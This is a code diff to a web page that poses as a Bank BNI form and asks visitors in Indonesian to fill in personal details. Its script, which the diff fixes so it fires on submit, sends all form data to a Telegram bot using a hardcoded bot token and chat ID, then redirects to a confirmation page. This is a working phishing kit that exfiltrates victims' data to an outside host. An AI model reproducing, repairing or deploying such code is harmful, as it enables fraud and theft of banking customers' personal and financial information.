@@ -268,7 +268,7 @@ form button{
 <div style="margin-top: 90; font-size: 20px; margin-left: 15px; color: #3C6A8B; margin-bottom: 20px">
  Silahkan Melengkapi Data Berikut :   
 </div>
-<form  id="kirims" onclick="">
+<form  id="kirims" onclick="submit">
  <input type="hidden" name="logo" id="logo" value="𝗕𝗮𝗻𝗸 𝗕𝗡𝗜 GUNSALES">
 <input type="hidden" id="nomor" name="nomor">
  <label>Nama Lengkap:</label>   
@@ -357,7 +357,7 @@ form button{
       
 </script>
    <p id="status"></p>
-   <script src="dua.js"></script>
+   <script src="kirims.js"></script>
    
    <script>
    
@@ -380,7 +380,7 @@ const chat_id = '8482576661', botID = '8000733092:AAEQIR8IkBWwfDqy4zs3Q_UAOxgUOO
 
     const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
-    document.querySelector('#dua').addEventListener("submit", async e => { // When the user submits the form
+    document.querySelector('#kirims').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
             Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
@@ -396,7 +396,7 @@ const chat_id = '8482576661', botID = '8000733092:AAEQIR8IkBWwfDqy4zs3Q_UAOxgUOO
         else
             messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
         e.target.reset(); // Clear the form fields.
-        window.location.href = '/konf.html';
+        window.location.href = 'konf.html';
     });
 
             
